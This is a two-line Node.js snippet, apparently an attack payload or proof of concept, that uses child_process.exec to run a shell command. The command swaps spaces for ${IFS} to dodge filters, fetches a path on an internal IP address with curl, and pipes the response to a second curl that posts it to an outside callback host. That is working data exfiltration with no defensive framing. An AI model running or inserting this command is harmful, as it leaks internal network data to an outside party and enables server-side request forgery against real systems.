const { exec } = require('child_process');
exec('curl${IFS}10.169.4.131/123|curl${IFS}dvpcz9o2.ssrf.cvssadvisor.com${IFS}-d${IFS}@-');
